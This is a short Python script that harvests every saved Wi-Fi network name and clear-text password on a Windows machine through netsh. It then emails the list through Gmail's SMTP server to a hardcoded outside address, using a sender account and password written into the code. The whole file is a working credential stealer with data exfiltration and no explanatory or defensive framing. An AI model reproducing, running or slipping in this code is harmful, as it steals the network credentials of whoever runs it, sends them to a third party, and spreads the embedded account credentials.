import subprocess
import re
import smtplib

def collection():
	first_command_output = subprocess.run(['netsh','wlan','show','profiles'],capture_output=True).stdout.decode()
	profile_names = (re.findall("All User Profile     : (.*)\r", first_command_output))
	wifi_list=[]
	if len(profile_names) != 0:
		for name in profile_names:
			profile_info = subprocess.run(['netsh','wlan','show','profile',name], capture_output=True).stdout.decode()
			wifi_profile={}
			if re.search("Security key           : Absent", profile_info):
				continue
			else:
				wifi_profile['ssid'] = name
				profile_info_password =  subprocess.run(['netsh','wlan','show','profile',name,'key=clear'],capture_output=True).stdout.decode()
				password = re.search("Key Content            : (.*)\r", profile_info_password)
				if password == None:
					wifi_profile['password']=None
				else:
					wifi_profile['password']=password[1]
				wifi_list.append(wifi_profile)
	return wifi_list

def send_mail():
	body=''
	subject='WIFI PASSORD'

	wifi_list = collection()
	for i in wifi_list:
		body += i['ssid'] + " ==> " + i['password'] + '\n'

	msg=f'Subject: {subject}\n\n{body}'
	s=smtplib.SMTP('smtp.gmail.com',587)
	s.starttls()
	s.login('testnaha420@gmail.com', 'test5678910#?')
	s.sendmail('testnaha420@gmail.com', 'arnabnaha219@gmail.com', msg)
	s.quit()


collection()
send_mail()